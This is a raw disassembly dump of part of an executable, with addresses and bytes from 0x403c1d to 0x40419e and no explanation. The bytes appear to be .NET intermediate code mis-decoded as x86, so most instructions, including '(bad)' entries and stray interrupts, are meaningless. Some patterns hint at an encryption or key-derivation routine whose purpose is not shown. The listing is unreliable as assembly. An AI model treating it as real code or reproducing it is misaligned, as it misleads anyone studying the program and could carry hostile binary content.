  403c1d:	1e                   	push   %ds
  403c1e:	00 00                	add    %al,(%eax)
  403c20:	00 06                	add    %al,(%esi)
  403c22:	39 06                	cmp    %eax,(%esi)
  403c24:	00 00                	add    %al,(%eax)
  403c26:	00 06                	add    %al,(%esi)
  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 b4             	or     -0x4c(%edx),%dh
  403d47:	21 00                	and    %eax,(%eax)
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	dc 01                	faddl  (%ecx)
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 ba                	jb     0x403d7b
  403dc1:	21 00                	and    %eax,(%eax)
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	72 1a                	jb     0x403dec
  403dd2:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  403dd6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403ddb:	25 00 00 00 07       	and    $0x7000000,%eax
  403de0:	72 24                	jb     0x403e06
  403de2:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  403de6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403deb:	60                   	pusha
  403dec:	00 00                	add    %al,(%eax)
  403dee:	00 07                	add    %al,(%edi)
  403df0:	72 32                	jb     0x403e24
  403df2:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  403df6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403dfb:	d9 00                	flds   (%eax)
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e02:	00 00                	add    %al,(%eax)
  403e04:	16                   	push   %ss
  403e05:	28 1a                	sub    %bl,(%edx)
  403e07:	00 00                	add    %al,(%eax)
  403e09:	06                   	push   %es
  403e0a:	73 94                	jae    0x403da0
  403e0c:	00 00                	add    %al,(%eax)
  403e0e:	06                   	push   %es
  403e0f:	25 72 ba 21 00       	and    $0x21ba72,%eax
  403e14:	70 6f                	jo     0x403e85
  403e16:	7f 00                	jg     0x403e18
  403e18:	00 06                	add    %al,(%esi)
  403e1a:	72 1a                	jb     0x403e36
  403e1c:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e20:	81 00 00 06 25 72    	addl   $0x72250600,(%eax)
  403e26:	d2 21                	shlb   %cl,(%ecx)
  403e28:	00 70 6f             	add    %dh,0x6f(%eax)
  403e2b:	7f 00                	jg     0x403e2d
  403e2d:	00 06                	add    %al,(%esi)
  403e2f:	28 17                	sub    %dl,(%edi)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	06                   	push   %es
  403e34:	6a 6f                	push   $0x6f
  403e36:	74 00                	je     0x403e38
  403e38:	00 06                	add    %al,(%esi)
  403e3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403e3b:	89 00                	mov    %eax,(%eax)
  403e3d:	00 06                	add    %al,(%esi)
  403e3f:	28 20                	sub    %ah,(%eax)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	06                   	push   %es
  403e44:	16                   	push   %ss
  403e45:	28 18                	sub    %bl,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	00 06                	add    %al,(%esi)
  403e51:	72 48                	jb     0x403e9b
  403e53:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e57:	7f 00                	jg     0x403e59
  403e59:	00 06                	add    %al,(%esi)
  403e5b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e5c:	8b 00                	mov    (%eax),%eax
  403e5e:	00 06                	add    %al,(%esi)
  403e60:	28 42 00             	sub    %al,0x0(%edx)
  403e63:	00 06                	add    %al,(%esi)
  403e65:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e69:	00 7e 24             	add    %bh,0x24(%esi)
  403e6c:	00 00                	add    %al,(%eax)
  403e6e:	04 06                	add    $0x6,%al
  403e70:	6f                   	outsl  %ds:(%esi),(%dx)
  403e71:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e76:	94                   	xchg   %eax,%esp
  403e77:	00 00                	add    %al,(%eax)
  403e79:	06                   	push   %es
  403e7a:	25 72 ba 21 00       	and    $0x21ba72,%eax
  403e7f:	70 6f                	jo     0x403ef0
  403e81:	7f 00                	jg     0x403e83
  403e83:	00 06                	add    %al,(%esi)
  403e85:	72 50                	jb     0x403ed7
  403e87:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e8b:	81 00 00 06 25 72    	addl   $0x72250600,(%eax)
  403e91:	66 26 00 70 6f       	data16 add %dh,%es:0x6f(%eax)
  403e96:	7f 00                	jg     0x403e98
  403e98:	00 06                	add    %al,(%esi)
  403e9a:	06                   	push   %es
  403e9b:	72 48                	jb     0x403ee5
  403e9d:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403ea1:	7f 00                	jg     0x403ea3
  403ea3:	00 06                	add    %al,(%esi)
  403ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea6:	8b 00                	mov    (%eax),%eax
  403ea8:	00 06                	add    %al,(%esi)
  403eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  403eab:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb1:	00 00                	add    %al,(%eax)
  403eb3:	06                   	push   %es
  403eb4:	28 20                	sub    %ah,(%eax)
  403eb6:	00 00                	add    %al,(%eax)
  403eb8:	06                   	push   %es
  403eb9:	38 06                	cmp    %al,(%esi)
  403ebb:	00 00                	add    %al,(%eax)
  403ebd:	00 06                	add    %al,(%esi)
  403ebf:	28 47 00             	sub    %al,0x0(%edi)
  403ec2:	00 06                	add    %al,(%esi)
  403ec4:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403eca:	b3 00                	mov    $0x0,%bl
  403ecc:	00 0a                	add    %cl,(%edx)
  403ece:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed1:	00 06                	add    %al,(%esi)
  403ed3:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403ed9:	72 74                	jb     0x403f4f
  403edb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403edf:	7f 00                	jg     0x403ee1
  403ee1:	00 06                	add    %al,(%esi)
  403ee3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ee4:	8b 00                	mov    (%eax),%eax
  403ee6:	00 06                	add    %al,(%esi)
  403ee8:	06                   	push   %es
  403ee9:	72 48                	jb     0x403f33
  403eeb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403eef:	7f 00                	jg     0x403ef1
  403ef1:	00 06                	add    %al,(%esi)
  403ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef4:	7a 00                	jp     0x403ef6
  403ef6:	00 06                	add    %al,(%esi)
  403ef8:	28 41 00             	sub    %al,0x0(%ecx)
  403efb:	00 06                	add    %al,(%esi)
  403efd:	26 7e 24             	es jle 0x403f24
  403f00:	00 00                	add    %al,(%eax)
  403f02:	04 28                	add    $0x28,%al
  403f04:	01 00                	add    %eax,(%eax)
  403f06:	00 2b                	add    %ch,(%ebx)
  403f08:	6f                   	outsl  %ds:(%esi),(%dx)
  403f09:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f0e:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f12:	00 12                	add    %dl,(%edx)
  403f14:	02 28                	add    (%eax),%ch
  403f16:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f1b:	09 72 48             	or     %esi,0x48(%edx)
  403f1e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f22:	7f 00                	jg     0x403f24
  403f24:	00 06                	add    %al,(%esi)
  403f26:	6f                   	outsl  %ds:(%esi),(%dx)
  403f27:	8b 00                	mov    (%eax),%eax
  403f29:	00 06                	add    %al,(%esi)
  403f2b:	06                   	push   %es
  403f2c:	72 74                	jb     0x403fa2
  403f2e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f32:	7f 00                	jg     0x403f34
  403f34:	00 06                	add    %al,(%esi)
  403f36:	6f                   	outsl  %ds:(%esi),(%dx)
  403f37:	8b 00                	mov    (%eax),%eax
  403f39:	00 06                	add    %al,(%esi)
  403f3b:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f41:	12 00                	adc    (%eax),%al
  403f43:	00 00                	add    %al,(%eax)
  403f45:	09 28                	or     %ebp,(%eax)
  403f47:	47                   	inc    %edi
  403f48:	00 00                	add    %al,(%eax)
  403f4a:	06                   	push   %es
  403f4b:	7e 24                	jle    0x403f71
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	04 09                	add    $0x9,%al
  403f51:	6f                   	outsl  %ds:(%esi),(%dx)
  403f52:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f57:	12 02                	adc    (%edx),%al
  403f59:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f5f:	b3 dd                	mov    $0xdd,%bl
  403f61:	0e                   	push   %cs
  403f62:	00 00                	add    %al,(%eax)
  403f64:	00 12                	add    %dl,(%edx)
  403f66:	02 fe                	add    %dh,%bh
  403f68:	16                   	push   %ss
  403f69:	04 00                	add    $0x0,%al
  403f6b:	00 1b                	add    %bl,(%ebx)
  403f6d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f6e:	33 00                	xor    (%eax),%eax
  403f70:	00 0a                	add    %cl,(%edx)
  403f72:	dc dd                	(bad)
  403f74:	0f 00 00             	sldt   (%eax)
  403f77:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f7a:	00 00                	add    %al,(%eax)
  403f7c:	0a 28                	or     (%eax),%ch
  403f7e:	49                   	dec    %ecx
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	06                   	push   %es
  403f82:	dd 00                	fldl   (%eax)
  403f84:	00 00                	add    %al,(%eax)
  403f86:	00 2a                	add    %ch,(%edx)
  403f88:	41                   	inc    %ecx
  403f89:	4c                   	dec    %esp
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 00                	add    %al,(%eax)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f91:	00 00                	add    %al,(%eax)
  403f93:	00 79 00             	add    %bh,0x0(%ecx)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	1d 01 00 00 0f       	sbb    $0xf000001,%eax
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	00 31                	add    %dh,(%ecx)
  403fa1:	00 00                	add    %al,(%eax)
  403fa3:	01 02                	add    %eax,(%edx)
  403fa5:	00 00                	add    %al,(%eax)
  403fa7:	00 62 01             	add    %ah,0x1(%edx)
  403faa:	00 00                	add    %al,(%eax)
  403fac:	57                   	push   %edi
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 b9 01 00 00 0e    	add    %bh,0xe000001(%ecx)
	...
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	00 cc                	add    %cl,%ah
  403fc5:	01 00                	add    %eax,(%eax)
  403fc7:	00 cc                	add    %cl,%ah
  403fc9:	01 00                	add    %eax,(%eax)
  403fcb:	00 0f                	add    %cl,(%edi)
  403fcd:	00 00                	add    %al,(%eax)
  403fcf:	00 31                	add    %dh,(%ecx)
  403fd1:	00 00                	add    %al,(%eax)
  403fd3:	01 13                	add    %edx,(%ebx)
  403fd5:	30 0b                	xor    %cl,(%ebx)
  403fd7:	00 11                	add    %dl,(%ecx)
  403fd9:	01 00                	add    %eax,(%eax)
  403fdb:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fde:	00 11                	add    %dl,(%ecx)
  403fe0:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fe6:	72 48                	jb     0x404030
  403fe8:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403fec:	7f 00                	jg     0x403fee
  403fee:	00 06                	add    %al,(%esi)
  403ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff1:	8b 00                	mov    (%eax),%eax
  403ff3:	00 06                	add    %al,(%esi)
  403ff5:	28 42 00             	sub    %al,0x0(%edx)
  403ff8:	00 06                	add    %al,(%esi)
  403ffa:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404000:	c0 00 00             	rolb   $0x0,(%eax)
  404003:	0a 72 7e             	or     0x7e(%edx),%dh
  404006:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40400a:	c1 00 00             	roll   $0x0,(%eax)
  40400d:	0a 28                	or     (%eax),%ch
  40400f:	c2 00 00             	ret    $0x0
  404012:	0a 0a                	or     (%edx),%cl
  404014:	7e 25                	jle    0x40403b
  404016:	00 00                	add    %al,(%eax)
  404018:	04 3a                	add    $0x3a,%al
  40401a:	85 00                	test   %eax,(%eax)
  40401c:	00 00                	add    %al,(%eax)
  40401e:	20 00                	and    %al,(%eax)
  404020:	01 00                	add    %eax,(%eax)
  404022:	00 72 9a             	add    %dh,-0x66(%edx)
  404025:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  404029:	d0 0f                	rorb   $1,(%edi)
  40402b:	00 00                	add    %al,(%eax)
  40402d:	02 28                	add    (%eax),%ch
  40402f:	c3                   	ret
  404030:	00 00                	add    %al,(%eax)
  404032:	0a 1f                	or     (%edi),%bl
  404034:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  40403a:	25 16 16 14 28       	and    $0x28141616,%eax
  40403f:	c4 00                	les    (%eax),%eax
  404041:	00 0a                	add    %cl,(%edx)
  404043:	a2 25 17 17 14       	mov    %al,0x14171725
  404048:	28 c4                	sub    %al,%ah
  40404a:	00 00                	add    %al,(%eax)
  40404c:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  404052:	28 c4                	sub    %al,%ah
  404054:	00 00                	add    %al,(%eax)
  404056:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  40405c:	28 c4                	sub    %al,%ah
  40405e:	00 00                	add    %al,(%eax)
  404060:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  404066:	28 c4                	sub    %al,%ah
  404068:	00 00                	add    %al,(%eax)
  40406a:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404070:	28 c4                	sub    %al,%ah
  404072:	00 00                	add    %al,(%eax)
  404074:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  40407a:	28 c4                	sub    %al,%ah
  40407c:	00 00                	add    %al,(%eax)
  40407e:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  404084:	28 c4                	sub    %al,%ah
  404086:	00 00                	add    %al,(%eax)
  404088:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  40408e:	28 c4                	sub    %al,%ah
  404090:	00 00                	add    %al,(%eax)
  404092:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  404098:	0a 28                	or     (%eax),%ch
  40409a:	c6 00 00             	movb   $0x0,(%eax)
  40409d:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040a3:	7e 25                	jle    0x4040ca
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	04 7b                	add    $0x7b,%al
  4040a9:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	04 06                	add    $0x6,%al
  4040b3:	28 06                	sub    %al,(%esi)
  4040b5:	00 00                	add    %al,(%eax)
  4040b7:	06                   	push   %es
  4040b8:	7e 0b                	jle    0x4040c5
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	04 7e                	add    $0x7e,%al
  4040be:	10 00                	adc    %al,(%eax)
  4040c0:	00 04 02             	add    %al,(%edx,%eax,1)
  4040c3:	72 a2                	jb     0x404067
  4040c5:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4040c9:	7f 00                	jg     0x4040cb
  4040cb:	00 06                	add    %al,(%esi)
  4040cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ce:	7a 00                	jp     0x4040d0
  4040d0:	00 06                	add    %al,(%esi)
  4040d2:	7e 1e                	jle    0x4040f2
  4040d4:	00 00                	add    %al,(%eax)
  4040d6:	04 7e                	add    $0x7e,%al
  4040d8:	08 00                	or     %al,(%eax)
  4040da:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040dd:	0f 00 00             	sldt   (%eax)
  4040e0:	04 7e                	add    $0x7e,%al
  4040e2:	04 00                	add    $0x0,%al
  4040e4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040e7:	c8 00 00 0a          	enter  $0x0,$0xa
  4040eb:	28 48 00             	sub    %cl,0x0(%eax)
  4040ee:	00 06                	add    %al,(%esi)
  4040f0:	2a 00                	sub    (%eax),%al
  4040f2:	00 00                	add    %al,(%eax)
  4040f4:	1b 30                	sbb    (%eax),%esi
  4040f6:	03 00                	add    (%eax),%eax
  4040f8:	5c                   	pop    %esp
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	00 15 00 00 11 02    	add    %dl,0x2110000
  404101:	28 18                	sub    %bl,(%eax)
  404103:	00 00                	add    %al,(%eax)
  404105:	0a 03                	or     (%ebx),%al
  404107:	28 ca                	sub    %cl,%dl
  404109:	00 00                	add    %al,(%eax)
  40410b:	0a 39                	or     (%ecx),%bh
  40410d:	0b 00                	or     (%eax),%eax
  40410f:	00 00                	add    %al,(%eax)
  404111:	72 d0                	jb     0x4040e3
  404113:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404117:	cb                   	lret
  404118:	00 00                	add    %al,(%eax)
  40411a:	0a 7a 03             	or     0x3(%edx),%bh
  40411d:	7e 2c                	jle    0x40414b
  40411f:	00 00                	add    %al,(%eax)
  404121:	04 20                	add    $0x20,%al
  404123:	50                   	push   %eax
  404124:	c3                   	ret
  404125:	00 00                	add    %al,(%eax)
  404127:	73 cc                	jae    0x4040f5
  404129:	00 00                	add    %al,(%eax)
  40412b:	0a 0a                	or     (%edx),%cl
  40412d:	02 06                	add    (%esi),%al
  40412f:	1f                   	pop    %ds
  404130:	20 6f cd             	and    %ch,-0x33(%edi)
  404133:	00 00                	add    %al,(%eax)
  404135:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404138:	00 00                	add    %al,(%eax)
  40413a:	04 02                	add    $0x2,%al
  40413c:	06                   	push   %es
  40413d:	1f                   	pop    %ds
  40413e:	40                   	inc    %eax
  40413f:	6f                   	outsl  %ds:(%esi),(%dx)
  404140:	cd 00                	int    $0x0
  404142:	00 0a                	add    %cl,(%edx)
  404144:	7d 2b                	jge    0x404171
  404146:	00 00                	add    %al,(%eax)
  404148:	04 dd                	add    $0xdd,%al
  40414a:	0d 00 00 00 06       	or     $0x6000000,%eax
  40414f:	39 06                	cmp    %eax,(%esi)
  404151:	00 00                	add    %al,(%eax)
  404153:	00 06                	add    %al,(%esi)
  404155:	6f                   	outsl  %ds:(%esi),(%dx)
  404156:	33 00                	xor    (%eax),%eax
  404158:	00 0a                	add    %cl,(%edx)
  40415a:	dc 2a                	fsubrl (%edx)
  40415c:	01 10                	add    %edx,(%eax)
  40415e:	00 00                	add    %al,(%eax)
  404160:	02 00                	add    (%eax),%al
  404162:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  404167:	0d 00 00 00 00       	or     $0x0,%eax
  40416c:	1b 30                	sbb    (%eax),%esi
  40416e:	05 00 15 01 00       	add    $0x11500,%eax
  404173:	00 16                	add    %dl,(%esi)
  404175:	00 00                	add    %al,(%eax)
  404177:	11 03                	adc    %eax,(%ebx)
  404179:	3a 0b                	cmp    (%ebx),%cl
  40417b:	00 00                	add    %al,(%eax)
  40417d:	00 72 18             	add    %dh,0x18(%edx)
  404180:	27                   	daa
  404181:	00 70 73             	add    %dh,0x73(%eax)
  404184:	cf                   	iret
  404185:	00 00                	add    %al,(%eax)
  404187:	0a 7a 73             	or     0x73(%edx),%bh
  40418a:	d0 00                	rolb   $1,(%eax)
  40418c:	00 0a                	add    %cl,(%edx)
  40418e:	0a 06                	or     (%esi),%al
  404190:	1f                   	pop    %ds
  404191:	20 6a 6f             	and    %ch,0x6f(%edx)
  404194:	4e                   	dec    %esi
  404195:	00 00                	add    %al,(%eax)
  404197:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40419a:	00 00                	add    %al,(%eax)
  40419c:	0a 0b                	or     (%ebx),%cl
  40419e:	07                   	pop    %es
